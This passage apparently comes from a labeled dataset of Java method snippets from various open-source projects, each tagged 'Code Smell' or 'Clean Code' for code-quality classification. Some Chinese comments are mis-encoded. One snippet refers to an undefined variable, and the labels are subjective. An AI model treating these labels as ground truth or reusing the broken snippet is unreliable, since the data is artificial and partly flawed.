  viewClassInfo.setMethodInfoList(allMethodInfo);
  result.addResultItem(CodeLocatorConstants.ResultKey.DATA,GsonUtils.sGson.toJson(viewClassInfo));
}
",1,Code Smell
"@Override public <N extends NameTree>N visitTypeName(N nameTree,ExecutionContext ctx){
  if (getCursor().firstEnclosing(J.Import.class) == null) {
    JavaType.FullyQualified fqn=TypeUtils.asFullyQualified(nameTree.getType());
    if (fqn != null && (typeMatcher == null || typeMatcher.matches(fqn))) {
      for (      JavaType.FullyQualified annotation : fqn.getAnnotations()) {
        if (TypeUtils.isOfClassType(annotation,""java.lang.Deprecated"")) {
          if (Boolean.TRUE.equals(ignoreDeprecatedScopes)) {
            Iterator<Cursor> cursorPath=getCursor().getPathAsCursors();
            while (cursorPath.hasNext()) {
              Cursor ancestor=cursorPath.next();
              if (ancestor.getValue() instanceof J.MethodDeclaration && isDeprecated(ancestor)) {
                return nameTree;
              }
              if (ancestor.getValue() instanceof J.ClassDeclaration && isDeprecated(ancestor)) {
                return nameTree;
              }
            }
          }
          return SearchResult.found(nameTree);
        }
      }
    }
  }
  return nameTree;
}
",1,Code Smell
"/** 
 * 鑾峰彇鏂囩珷
 * @param articleSearchDTO
 * @param currentUser
 * @param articleStateEnum
 * @return
 */
@Override public PageInfo<ArticleDTO> getList(ArticleSearchDTO articleSearchDTO,UserSsoDTO currentUser,ArticleStateEnum articleStateEnum){
  List<Integer> articleIds=new ArrayList<>();
  if (CollectionUtils.isNotEmpty(articleSearchDTO.getLabelIds())) {
    List<ArticleLabelDTO> articleLabelDTOS=articleLabelService.getByLabelIds(articleSearchDTO.getLabelIds());
    if (CollectionUtils.isNotEmpty(articleLabelDTOS)) {
      articleIds=articleLabelDTOS.stream().map(ArticleLabelDTO::getArticleId).collect(Collectors.toList());
    }
 else {
      return new PageInfo<>(new ArrayList<>());
    }
  }
  ArticlePoExample example=new ArticlePoExample();
  ArticlePoExample.Criteria criteria=example.createCriteria().andIsDeletedEqualTo(false);
  if (articleStateEnum != null) {
    criteria.andStateEqualTo(articleStateEnum.getCode());
  }
  if (articleSearchDTO.getId() != null) {
    criteria.andIdEqualTo(articleSearchDTO.getId());
  }
  if (StringUtils.isNotBlank(articleSearchDTO.getTitle())) {
    criteria.andTitleLike(""%"" + articleSearchDTO.getTitle() + ""%"");
  }
  if (CollectionUtils.isNotEmpty(articleIds)) {
    criteria.andIdIn(articleIds);
  }
  if (articleSearchDTO.getCreateUser() != null) {
    criteria.andCreateUserEqualTo(articleSearchDTO.getCreateUser());
  }
  example.setOrderByClause(""top desc, create_time desc, `id` desc"");
  PageHelper.startPage(articleSearchDTO.getCurrentPage(),articleSearchDTO.getPageSize());
  List<ArticlePo> articlePos=articlePoMapper.selectByExample(example);
  PageInfo<ArticleDTO> pageInfo=ArticleMS.INSTANCE.toPage(new PageInfo<>(articlePos));
  if (CollectionUtils.isEmpty(pageInfo.getList())) {
    return pageInfo;
  }
  buildArticleInfo(pageInfo.getList(),currentUser);
  return pageInfo;
}
",1,Code Smell
"Component parse(ContainerDslContext context,Tokens tokens){
  if (tokens.hasMoreThan(TAGS_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR);
  }
  if (!tokens.includes(NAME_INDEX)) {
    throw new RuntimeException(""Expected: "" + GRAMMAR);
  }
  Container container=context.getContainer();
  Component component=null;
  String name=tokens.get(NAME_INDEX);
  if (context.isExtendingWorkspace()) {
    component=container.getComponentWithName(name);
  }
  if (component == null) {
    component=container.addComponent(name);
  }
  if (tokens.includes(DESCRIPTION_INDEX)) {
    String description=tokens.get(DESCRIPTION_INDEX);
    component.setDescription(description);
  }
  if (tokens.includes(TECHNOLOGY_INDEX)) {
    String technology=tokens.get(TECHNOLOGY_INDEX);
    component.setTechnology(technology);
  }
  if (tokens.includes(TAGS_INDEX)) {
    String tags=tokens.get(TAGS_INDEX);
    component.addTags(tags.split("",""));
  }
  if (context.hasGroup()) {
    component.setGroup(context.getGroup().getName());
    context.getGroup().addElement(component);
  }
  return component;
}
",0,Clean Code
"private void searchEmojiByKeyword(){
  String[] newLanguage=AndroidUtilities.getCurrentKeyboardLanguage();
  if (!Arrays.equals(newLanguage,lastSearchKeyboardLanguage)) {
    MediaDataController.getInstance(currentAccount).fetchNewEmojiKeywords(newLanguage);
  }
  lastSearchKeyboardLanguage=newLanguage;
  String query=lastSearch;
  cancelEmojiSearch();
  searchRunnable=() -> MediaDataController.getInstance(currentAccount).getEmojiSuggestions(lastSearchKeyboardLanguage,query,true,(param,alias) -> {
    if (query.equals(lastSearch)) {
      if (!param.isEmpty()) {
        keywordResults=param;
      }
      notifyDataSetChanged();
      delegate.needChangePanelVisibility(visible=!param.isEmpty());
    }
  }
,SharedConfig.suggestAnimatedEmoji && UserConfig.getInstance(currentAccount).isPremium());
  if (keywordResults == null || keywordResults.isEmpty()) {
    AndroidUtilities.runOnUIThread(searchRunnable,1000);
  }
 else {
    searchRunnable.run();
  }
}
public void searchEmojiByKeyword(CharSequence emoji){
  boolean searchEmoji=emoji != null && emoji.length() > 0 && emoji.length() <= 14;
  String originalEmoji="""";
  if (searchEmoji) {
    originalEmoji=emoji.toString();
    int length=emoji.length();
    for (int a=0; a < length; a++) {
      char ch=emoji.charAt(a);
      char nch=a < length - 1 ? emoji.charAt(a + 1) : 0;
      if (a < length - 1 && ch == 0xD83C && nch >= 0xDFFB && nch <= 0xDFFF) {
        emoji=TextUtils.concat(emoji.subSequence(0,a),emoji.subSequence(a + 2,emoji.length()));
        length-=2;
        a--;
      }
 else       if (ch == 0xfe0f) {
        emoji=TextUtils.concat(emoji.subSequence(0,a),emoji.subSequence(a + 1,emoji.length()));
        length--;
        a--;
      }
    }
  }
  lastSearch=emoji.toString().trim();
  boolean isValidEmoji=searchEmoji && (Emoji.isValidEmoji(originalEmoji) || Emoji.isValidEmoji(lastSearch));
  if (isValidEmoji) {
    TLRPC.Document animatedSticker=MediaDataController.getInstance(currentAccount).getEmojiAnimatedSticker(emoji);
    if (animatedSticker != null) {
      ArrayList<TLRPC.TL_messages_stickerSet> sets=MediaDataController.getInstance(currentAccount).getStickerSets(MediaDataController.TYPE_EMOJI);
      File f=FileLoader.getInstance(currentAccount).getPathToAttach(animatedSticker,true);
      if (!f.exists()) {
        FileLoader.getInstance(currentAccount).loadFile(ImageLocation.getForDocument(animatedSticker),sets.get(0),null,FileLoader.PRIORITY_NORMAL,1);
      }
    }
  }
  if (visible && (keywordResults == null || keywordResults.isEmpty())) {
    visible=false;
    delegate.needChangePanelVisibility(false);
    notifyDataSetChanged();
  }
  if (!isValidEmoji) {
    searchEmojiByKeyword();
  }
 else {
    clearSearch();
    delegate.needChangePanelVisibility(false);
  }
}",1,Code Smell
"/** 
 * Parse and return  {@link PathStrategy} for given authority as defined in{@link #META_DATA_FILE_PROVIDER_PATHS} {@code <meta-data>}.
 * @see #getPathStrategy(Context,String)
 */
private static PathStrategy parsePathStrategy(Context context,String authority) throws IOException, XmlPullParserException {
  final SimplePathStrategy strat=new SimplePathStrategy(authority);
  final ProviderInfo info=context.getPackageManager().resolveContentProvider(authority,PackageManager.GET_META_DATA);
  final XmlResourceParser in=info.loadXmlMetaData(context.getPackageManager(),META_DATA_FILE_PROVIDER_PATHS);
  if (in == null) {
    throw new IllegalArgumentException(""Missing "" + META_DATA_FILE_PROVIDER_PATHS + "" meta-data"");
  }
  int type;
  while ((type=in.next()) != END_DOCUMENT) {
    if (type == START_TAG) {
      final String tag=in.getName();
      final String name=in.getAttributeValue(null,ATTR_NAME);
      String path=in.getAttributeValue(null,ATTR_PATH);
      File target=null;
      if (TAG_ROOT_PATH.equals(tag)) {
        target=DEVICE_ROOT;
      }
 else       if (TAG_FILES_PATH.equals(tag)) {
        target=context.getFilesDir();
      }
 else       if (TAG_CACHE_PATH.equals(tag)) {
        target=context.getCacheDir();
      }
 else       if (TAG_EXTERNAL.equals(tag)) {
        target=Environment.getExternalStorageDirectory();
      }
 else       if (TAG_EXTERNAL_FILES.equals(tag)) {
        File[] externalFilesDirs=ContextCompat.getExternalFilesDirs(context,null);
        if (externalFilesDirs.length > 0) {
          target=externalFilesDirs[0];
        }
      }
 else       if (TAG_EXTERNAL_CACHE.equals(tag)) {
        File[] externalCacheDirs=ContextCompat.getExternalCacheDirs(context);
        if (externalCacheDirs.length > 0) {
          target=externalCacheDirs[0];
        }
      }
      if (target != null) {
        strat.addRoot(name,buildPath(target,path));
      }
    }
  }
  return strat;
}",1,Code Smell
"/** 
 * 瑙ｆ瀽骞跺鍏@code [}鏍囪涔嬪悗鐨勪竴涓暟缁勩��
 * @param dataExchange
 * @param context
 * @param cn
 * @param p
 * @param tableName
 * @throws Throwable
 */
@SuppressWarnings(""unchecked"") protected void importJsonArray(JsonDataImport dataExchange,IndexFormatDataExchangeContext context,Connection cn,JsonParser p,Table table) throws Throwable {
  JsonDataImportOption importOption=dataExchange.getImportOption();
  List<Boolean> importKeyColumns=isImportKeyColumns(table,table.getColumns());
  PreparedStatement prevSt=null;
  List<Column> prevColumns=null;
  while (p.hasNext()) {
    Event event=p.next();
    if (Event.END_ARRAY.equals(event))     break;
    if (!Event.START_OBJECT.equals(event))     throw new IllegalJsonDataFormatException(p.getLocation(),true,Event.START_OBJECT);
    JsonLocation jsonLocation=p.getLocation();
    context.setDataIndex(RowColumnDataIndex.valueOf(jsonLocation.getLineNumber(),jsonLocation.getColumnNumber()));
    Map<String,Object> row=parseNextObject(p);
    Object[] myColumnValuess=getColumnValues(dataExchange,table,importKeyColumns,row);
    List<Column> myColumns=(List<Column>)myColumnValuess[0];
    List<Object> myColumnValues=(List<Object>)myColumnValuess[1];
    if (!myColumns.isEmpty()) {
      boolean newSql=false;
      if (prevSt == null || prevColumns == null)       newSql=true;
 else       if (myColumns.equals(prevColumns))       newSql=false;
 else       newSql=true;
      if (newSql) {
        JdbcUtil.closeStatement(prevSt);
        String sql=buildInsertPreparedSql(cn,table.getName(),myColumns);
        prevSt=cn.prepareStatement(sql);
        prevColumns=myColumns;
      }
      importValueData(cn,prevSt,prevColumns,myColumnValues,context.getDataIndex(),importOption.isNullForIllegalColumnValue(),importOption.getExceptionResolve(),context.getDataFormatContext(),dataExchange.getListener());
    }
  }
  JdbcUtil.closeStatement(prevSt);
}",1,Code Smell
"public void setParentLayout(INavigationLayout layout){
  if (parentLayout != layout) {
    parentLayout=layout;
    inBubbleMode=parentLayout != null && parentLayout.isInBubbleMode();
    if (fragmentView != null) {
      ViewGroup parent=(ViewGroup)fragmentView.getParent();
      if (parent != null) {
        try {
          onRemoveFromParent();
          parent.removeViewInLayout(fragmentView);
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
      }
      if (parentLayout != null && parentLayout.getView().getContext() != fragmentView.getContext()) {
        fragmentView=null;
      }
    }
    if (actionBar != null) {
      boolean differentParent=parentLayout != null && parentLayout.getView().getContext() != actionBar.getContext();
      if (actionBar.shouldAddToContainer() || differentParent) {
        ViewGroup parent=(ViewGroup)actionBar.getParent();
        if (parent != null) {
          try {
            parent.removeViewInLayout(actionBar);
          }
 catch (          Exception e) {
            FileLog.e(e);
          }
        }
      }
      if (differentParent) {
        actionBar=null;
      }
    }
    if (parentLayout != null && actionBar == null) {
      actionBar=createActionBar(parentLayout.getView().getContext());
      if (actionBar != null) {
        actionBar.parentFragment=this;
      }
    }
  }
}
",1,Code Smell
"@TestOnly public static String[] revokeSessionUsingSessionHandles(Main main,String[] sessionHandles) throws StorageQueryException {
  Storage storage=StorageLayer.getStorage(main);
  return revokeSessionUsingSessionHandles(main,new AppIdentifier(null,null),storage,sessionHandles);
}
public static String[] revokeSessionUsingSessionHandles(Main main,AppIdentifier appIdentifier,Storage storage,String[] sessionHandles) throws StorageQueryException {
  Map<String,List<String>> sessionHandleMap=new HashMap<>();
  for (  String sessionHandle : sessionHandles) {
    String tenantId=getTenantIdFromSessionHandle(sessionHandle);
    if (tenantId == null) {
      tenantId=TenantIdentifier.DEFAULT_TENANT_ID;
    }
    if (!sessionHandleMap.containsKey(tenantId)) {
      sessionHandleMap.put(tenantId,new ArrayList<>());
    }
    sessionHandleMap.get(tenantId).add(sessionHandle);
  }
  List<String> revokedSessionHandles=new ArrayList<>();
  for (  String tenantId : sessionHandleMap.keySet()) {
    String[] sessionHandlesForTenant=sessionHandleMap.get(tenantId).toArray(new String[0]);
    TenantIdentifier tenantIdentifier=new TenantIdentifier(appIdentifier.getConnectionUriDomain(),appIdentifier.getAppId(),tenantId);
    Storage tenantStorage=null;
    try {
      tenantStorage=StorageLayer.getStorage(tenantIdentifier,main);
    }
 catch (    TenantOrAppNotFoundException e) {
      continue;
    }
    String[] sessionHandlesRevokedForTenant=revokeSessionUsingSessionHandles(tenantIdentifier,tenantStorage,sessionHandlesForTenant);
    revokedSessionHandles.addAll(Arrays.asList(sessionHandlesRevokedForTenant));
  }
  return revokedSessionHandles.toArray(new String[0]);
}
private static String[] revokeSessionUsingSessionHandles(TenantIdentifier tenantIdentifier,Storage storage,String[] sessionHandles) throws StorageQueryException {
  Set<String> validHandles=new HashSet<>();
  if (sessionHandles.length > 1) {
    for (    String sessionHandle : sessionHandles) {
      if (((SessionStorage)storage).getSession(tenantIdentifier,sessionHandle) != null) {
        validHandles.add(sessionHandle);
      }
    }
  }
  int numberOfSessionsRevoked=((SessionStorage)storage).deleteSession(tenantIdentifier,sessionHandles);
  if (numberOfSessionsRevoked == sessionHandles.length) {
    return sessionHandles;
  }
 else   if (numberOfSessionsRevoked == 0) {
    return new String[0];
  }
 else {
    List<String> revokedSessionHandles=new ArrayList<>();
    for (    String sessionHandle : sessionHandles) {
      if (!validHandles.contains(sessionHandle)) {
        continue;
      }
      if (((SessionStorage)storage).getSession(tenantIdentifier,sessionHandle) == null) {
        revokedSessionHandles.add(sessionHandle);
      }
    }
    return revokedSessionHandles.toArray(new String[0]);
  }
}",1,Code Smell
"@EventHandler private void onTick(TickEvent.Pre event){
  for (  Hole hole : holes)   holePool.free(hole);
  holes.clear();
  BlockIterator.register(horizontalRadius.get(),verticalRadius.get(),(blockPos,blockState) -> {
    if (!validHole(blockPos))     return;
    int bedrock=0, obsidian=0;
    Direction air=null;
    for (    Direction direction : Direction.values()) {
      if (direction == Direction.UP)       continue;
      BlockPos offsetPos=blockPos.offset(direction);
      BlockState state=mc.world.getBlockState(offsetPos);
      if (state.getBlock() == Blocks.BEDROCK)       bedrock++;
 else       if (state.getBlock() == Blocks.OBSIDIAN)       obsidian++;
 else       if (direction == Direction.DOWN)       return;
 else       if (doubles.get() && air == null && validHole(offsetPos)) {
        for (        Direction dir : Direction.values()) {
          if (dir == direction.getOpposite() || dir == Direction.UP)           continue;
          BlockState blockState1=mc.world.getBlockState(offsetPos.offset(dir));
          if (blockState1.getBlock() == Blocks.BEDROCK)           bedrock++;
 else           if (blockState1.getBlock() == Blocks.OBSIDIAN)           obsidian++;
 else           return;
        }
        air=direction;
      }
    }
    if (obsidian + bedrock == 5 && air == null) {
      holes.add(holePool.get().set(blockPos,obsidian == 5 ? Hole.Type.Obsidian : (bedrock == 5 ? Hole.Type.Bedrock : Hole.Type.Mixed),NULL));
    }
 else     if (obsidian + bedrock == 8 && doubles.get() && air != null) {
      holes.add(holePool.get().set(blockPos,obsidian == 8 ? Hole.Type.Obsidian : (bedrock == 8 ? Hole.Type.Bedrock : Hole.Type.Mixed),Dir.get(air)));
    }
  }
);
}",1,Code Smell
"@Override public boolean apply(String value){
  if (value == null) {
    return true;
  }
  if (value.length() == 1) {
    var c=value.charAt(0);
    if (Character.isDigit(c)) {
      selected=Integer.parseInt(value) - 1;
      return true;
    }
    for (int i=0; i < elements.size(); i++) {
      if (elements.get(i).getCharacter() != null && elements.get(i).getCharacter().equals(c)) {
        selected=i;
        return true;
      }
    }
  }
 else {
    for (int i=0; i < elements.size(); i++) {
      if (elements.get(i).getDescription().equalsIgnoreCase(value)) {
        selected=i;
        return true;
      }
    }
  }
  return false;
}",1,Code Smell
"private CharSequence getName(double lat,double _long){
  if (loading) {
    return lastName;
  }
  if (Math.abs(lastLat - lat) > 0.000001d || Math.abs(lastLong - _long) > 0.000001d || TextUtils.isEmpty(lastName)) {
    loading=true;
    Utilities.globalQueue.postRunnable(() -> {
      try {
        Geocoder geocoder=new Geocoder(ApplicationLoader.applicationContext,LocaleController.getInstance().getCurrentLocale());
        List<Address> addresses=geocoder.getFromLocation(lat,_long,1);
        if (addresses.isEmpty()) {
          lastName=LocationController.detectOcean(_long,lat);
          if (lastName == null) {
            lastName="""";
          }
 else {
            lastName=""馃寠 "" + lastName;
          }
        }
 else {
          Address addr=addresses.get(0);
          StringBuilder sb=new StringBuilder();
          HashSet<String> parts=new HashSet<>();
          parts.add(addr.getSubAdminArea());
          parts.add(addr.getAdminArea());
          parts.add(addr.getLocality());
          parts.add(addr.getCountryName());
          for (          String part : parts) {
            if (TextUtils.isEmpty(part)) {
              continue;
            }
            if (sb.length() > 0) {
              sb.append("", "");
            }
            sb.append(part);
          }
          lastName=sb.toString();
          String emoji=LocationController.countryCodeToEmoji(addr.getCountryCode());
          if (emoji != null && Emoji.getEmojiDrawable(emoji) != null) {
            lastName=emoji + "" "" + lastName;
          }
        }
      }
 catch (      Exception ignore) {
      }
      AndroidUtilities.runOnUIThread(() -> {
        lastLat=lat;
        lastLong=_long;
        loading=false;
        lastName=Emoji.replaceEmoji(lastName,nameTextView.getPaint().getFontMetricsInt(),false);
        nameTextView.setText(lastName);
      }
);
    }
);
  }
  return lastName;
}",1,Code Smell
"private void recvDecodingTables() throws IOException {
  final BitInputStream bin=this.bin;
  final Data dataShadow=this.data;
  final boolean[] inUse=dataShadow.inUse;
  final byte[] pos=dataShadow.recvDecodingTables_pos;
  final byte[] selector=dataShadow.selector;
  final byte[] selectorMtf=dataShadow.selectorMtf;
  int inUse16=0;
  for (int i=0; i < 16; i++) {
    if (bsGetBit(bin)) {
      inUse16|=1 << i;
    }
  }
  Arrays.fill(inUse,false);
  for (int i=0; i < 16; i++) {
    if ((inUse16 & (1 << i)) != 0) {
      final int i16=i << 4;
      for (int j=0; j < 16; j++) {
        if (bsGetBit(bin)) {
          inUse[i16 + j]=true;
        }
      }
    }
  }
  makeMaps();
  final int alphaSize=this.nInUse + 2;
  final int nGroups=bsR(bin,3);
  final int selectors=bsR(bin,15);
  if (selectors < 0) {
    throw new IOException(""Corrupted input, nSelectors value negative"");
  }
  checkBounds(alphaSize,MAX_ALPHA_SIZE + 1,""alphaSize"");
  checkBounds(nGroups,N_GROUPS + 1,""nGroups"");
  for (int i=0; i < selectors; i++) {
    int j=0;
    while (bsGetBit(bin)) {
      j++;
    }
    if (i < MAX_SELECTORS) {
      selectorMtf[i]=(byte)j;
    }
  }
  final int nSelectors=selectors > MAX_SELECTORS ? MAX_SELECTORS : selectors;
  for (int v=nGroups; --v >= 0; ) {
    pos[v]=(byte)v;
  }
  for (int i=0; i < nSelectors; i++) {
    int v=selectorMtf[i] & 0xff;
    checkBounds(v,N_GROUPS,""selectorMtf"");
    final byte tmp=pos[v];
    while (v > 0) {
      pos[v]=pos[v - 1];
      v--;
    }
    pos[0]=tmp;
    selector[i]=tmp;
  }
  final char[][] len=dataShadow.temp_charArray2d;
  for (int t=0; t < nGroups; t++) {
    int curr=bsR(bin,5);
    final char[] len_t=len[t];
    for (int i=0; i < alphaSize; i++) {
      while (bsGetBit(bin)) {
        curr+=bsGetBit(bin) ? -1 : 1;
      }
      len_t[i]=(char)curr;
    }
  }
  createHuffmanDecodingTables(alphaSize,nGroups);
}",1,Code Smell
"/** 
 * 鍚慾son涓坊鍔犲睘鎬�
 * @return json
 */
public static <V>String add(String json,String key,V value){
  try {
    JsonNode node=mapper.readTree(json);
    add(node,key,value);
    return node.toString();
  }
 catch (  IOException e) {
    throw new JacksonException(StrUtil.format(""jackson add error, json: {}, key: {}, value: {}"",json,key,value),e);
  }
}
/** 
 * 鍚慾son涓坊鍔犲睘鎬�
 */
private static <V>void add(JsonNode jsonNode,String key,V value){
  if (value instanceof String) {
    ((ObjectNode)jsonNode).put(key,(String)value);
  }
 else   if (value instanceof Short) {
    ((ObjectNode)jsonNode).put(key,(Short)value);
  }
 else   if (value instanceof Integer) {
    ((ObjectNode)jsonNode).put(key,(Integer)value);
  }
 else   if (value instanceof Long) {
    ((ObjectNode)jsonNode).put(key,(Long)value);
  }
 else   if (value instanceof Float) {
    ((ObjectNode)jsonNode).put(key,(Float)value);
  }
 else   if (value instanceof Double) {
    ((ObjectNode)jsonNode).put(key,(Double)value);
  }
 else   if (value instanceof BigDecimal) {
    ((ObjectNode)jsonNode).put(key,(BigDecimal)value);
  }
 else   if (value instanceof BigInteger) {
    ((ObjectNode)jsonNode).put(key,(BigInteger)value);
  }
 else   if (value instanceof Boolean) {
    ((ObjectNode)jsonNode).put(key,(Boolean)value);
  }
 else   if (value instanceof byte[]) {
    ((ObjectNode)jsonNode).put(key,(byte[])value);
  }
 else {
    ((ObjectNode)jsonNode).put(key,to(value));
  }
}
",0,Clean Code
"private boolean isColorTooSimilar(BufferedImage image,int left,int top,int width,int height,Color setColor){
  int startX=left + 2;
  int endX=left + width - 2;
  int startY=top + 2;
  int endY=top + height - 2;
  int similarPointCount=0;
  int totalPointCount=0;
  for (int j=startY; j < endY; j++) {
    int pixelColor=getImageRGB(image,startX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,endX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  if ((similarPointCount * 1.0 / totalPointCount) >= 0.5f) {
    return true;
  }
  similarPointCount=0;
  totalPointCount=0;
  for (int j=startX; j < endX; j++) {
    int pixelColor=getImageRGB(image,j,startY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,j,endY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  if ((similarPointCount * 1.0 / totalPointCount) >= 0.5f) {
    return true;
  }
  startX=left - 2;
  endX=left + width + 2;
  startY=top - 2;
  endY=top + height + 2;
  similarPointCount=0;
  totalPointCount=0;
  for (int j=startY; j < endY; j++) {
    int pixelColor=getImageRGB(image,startX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,endX,j);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  for (int j=startX; j < endX; j++) {
    int pixelColor=getImageRGB(image,j,startY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
    pixelColor=getImageRGB(image,j,endY);
    if (ColorUtils.calculateColorDistance(new Color(pixelColor),setColor) < MIN_COLOR_DISTANCE) {
      similarPointCount++;
    }
    totalPointCount++;
  }
  return ((similarPointCount * 1.0 / totalPointCount) >= 0.5f);
}",1,Code Smell
"public void checkMessages(ChatActivity.ChatActivityAdapter chatAdapter,int maxAdapterPosition,int minAdapterPosition,long currentTime){
  ArrayList<MessageObject> messages=chatAdapter.getMessages();
  if (!chatActivity.isInScheduleMode() && maxAdapterPosition >= 0 && minAdapterPosition >= 0) {
    int from=minAdapterPosition - chatAdapter.messagesStartRow - 10;
    int to=maxAdapterPosition - chatAdapter.messagesStartRow + 10;
    if (from < 0) {
      from=0;
    }
    if (to > messages.size()) {
      to=messages.size();
    }
    reactionsToCheck.clear();
    extendedMediaToCheck.clear();
    storiesToCheck.clear();
    for (int i=from; i < to; i++) {
      MessageObject messageObject=messages.get(i);
      if (chatActivity.getThreadMessage() != messageObject && messageObject.getId() > 0 && messageObject.messageOwner.action == null && (currentTime - messageObject.reactionsLastCheckTime) > 15000L) {
        messageObject.reactionsLastCheckTime=currentTime;
        reactionsToCheck.add(messageObject);
      }
      if (chatActivity.getThreadMessage() != messageObject && messageObject.getId() > 0 && messageObject.hasExtendedMediaPreview() && (currentTime - messageObject.extendedMediaLastCheckTime) > 30000L) {
        messageObject.extendedMediaLastCheckTime=currentTime;
        extendedMediaToCheck.add(messageObject);
      }
      if (messageObject.type == MessageObject.TYPE_STORY || messageObject.type == MessageObject.TYPE_STORY_MENTION || messageObject.messageOwner.replyStory != null) {
        TL_stories.StoryItem storyItem=messageObject.type == MessageObject.TYPE_STORY || messageObject.type == MessageObject.TYPE_STORY_MENTION ? messageObject.messageOwner.media.storyItem : messageObject.messageOwner.replyStory;
        if (storyItem == null || storyItem instanceof TL_stories.TL_storyItemDeleted) {
          continue;
        }
        if (currentTime - storyItem.lastUpdateTime > 1000 * 5 * 60) {
          storyItem.lastUpdateTime=currentTime;
          storiesToCheck.add(messageObject);
        }
      }
    }
    loadReactionsForMessages(chatActivity.getDialogId(),reactionsToCheck);
    loadExtendedMediaForMessages(chatActivity.getDialogId(),extendedMediaToCheck);
    loadStoriesForMessages(chatActivity.getDialogId(),storiesToCheck);
  }
}",1,Code Smell
"protected String renderContent(NoticeTemplate noticeTemplate,Alert alert) throws TemplateException, IOException {
  StringTemplateLoader stringLoader=new StringTemplateLoader();
  freemarker.template.Template templateRes;
  Configuration cfg=new Configuration(Configuration.VERSION_2_3_0);
  cfg.setNumberFormat(NUMBER_FORMAT);
  Map<String,Object> model=new HashMap<>(16);
  model.put(""title"",bundle.getString(""alerter.notify.title""));
  if (alert.getTags() != null) {
    String monitorId=alert.getTags().get(CommonConstants.TAG_MONITOR_ID);
    if (monitorId != null) {
      model.put(""monitorId"",monitorId);
    }
    String monitorName=alert.getTags().get(CommonConstants.TAG_MONITOR_NAME);
    if (monitorName != null) {
      model.put(""monitorName"",monitorName);
    }
    String monitorHost=alert.getTags().get(CommonConstants.TAG_MONITOR_HOST);
    if (monitorHost != null) {
      model.put(""monitorHost"",monitorHost);
    }
    String thresholdId=alert.getTags().get(CommonConstants.TAG_THRESHOLD_ID);
    if (thresholdId != null) {
      model.put(""thresholdId"",thresholdId);
    }
  }
  model.put(""alarmId"",alert.getId());
  model.put(""status"",alert.getStatus());
  model.put(""monitorIdLabel"",bundle.getString(""alerter.notify.monitorId""));
  model.put(""monitorNameLabel"",bundle.getString(""alerter.notify.monitorName""));
  model.put(""monitorHostLabel"",bundle.getString(""alerter.notify.monitorHost""));
  model.put(""target"",alert.getTarget());
  model.put(""targetLabel"",bundle.getString(""alerter.notify.target""));
  model.put(""priorityLabel"",bundle.getString(""alerter.notify.priority""));
  model.put(""priority"",bundle.getString(""alerter.priority."" + alert.getPriority()));
  model.put(""priorityValue"",alert.getPriority());
  model.put(""triggerTimeLabel"",bundle.getString(""alerter.notify.triggerTime""));
  model.put(""triggerTime"",DTF.format(Instant.ofEpochMilli(alert.getLastAlarmTime()).atZone(ZoneId.systemDefault()).toLocalDateTime()));
  if (CommonConstants.ALERT_STATUS_CODE_RESTORED == alert.getStatus()) {
    model.put(""restoreTimeLabel"",bundle.getString(""alerter.notify.restoreTime""));
    model.put(""restoreTime"",DTF.format(Instant.ofEpochMilli(alert.getFirstAlarmTime()).atZone(ZoneId.systemDefault()).toLocalDateTime()));
  }
  model.put(""timesLabel"",bundle.getString(""alerter.notify.times""));
  model.put(""times"",alert.getTimes());
  model.put(""contentLabel"",bundle.getString(""alerter.notify.content""));
  model.put(""content"",alert.getContent());
  model.put(""tagsLabel"",bundle.getString(""alerter.notify.tags""));
  model.put(""tags"",alert.getTags());
  if (noticeTemplate == null) {
    noticeTemplate=noticeConfigService.getDefaultNoticeTemplateByType(type());
  }
  if (noticeTemplate == null) {
    log.error(""alert does not have mapping default notice template. type: {}."",type());
    throw new NullPointerException(type() + "" does not have mapping default notice template"");
  }
  String templateName=""freeMakerTemplate"";
  stringLoader.putTemplate(templateName,noticeTemplate.getContent());
  cfg.setTemplateLoader(stringLoader);
  templateRes=cfg.getTemplate(templateName,Locale.CHINESE);
  String template=FreeMarkerTemplateUtils.processTemplateIntoString(templateRes,model);
  return template.replaceAll(""((\r\n)|\n)[\\s\t ]*(\\1)+"",""$1"");
}",1,Code Smell
"@Override public DefUse analyze(IR ir){
  DataflowResult<Stmt,SetFact<Stmt>> rdResult=ir.getResult(ReachingDefinition.ID);
  TwoKeyMultiMap<Stmt,Var,Stmt> defs=computeDefs ? Maps.newTwoKeyMultiMap(new IndexMap<>(ir,ir.getStmts().size()),() -> Maps.newMultiMap(Maps.newHybridMap())) : null;
  MultiMap<Stmt,Stmt> uses=computeUses ? Maps.newMultiMap(new IndexMap<>(ir,ir.getStmts().size()),Sets::newHybridSet) : null;
  for (  Stmt stmt : ir) {
    SetFact<Stmt> reachDefs=rdResult.getInFact(stmt);
    for (    RValue use : stmt.getUses()) {
      if (use instanceof Var) {
        for (        Stmt reachDef : reachDefs) {
          reachDef.getDef().ifPresent(lhs -> {
            if (lhs.equals(use)) {
              if (computeDefs) {
                defs.put(stmt,useVar,reachDef);
              }
              if (computeUses) {
                uses.put(reachDef,stmt);
              }
            }
          }
);
        }
      }
    }
  }
  return new DefUse(defs,uses);
}
",1,Code Smell
"public void cancel(){
  cancel(false);
}
private void cancel(boolean deleteFiles){
  Utilities.stageQueue.postRunnable(() -> {
    if (state != stateFinished && state != stateFailed) {
      cancelRequests();
      onFail(false,1);
    }
    if (deleteFiles) {
      if (cacheFileFinal != null) {
        try {
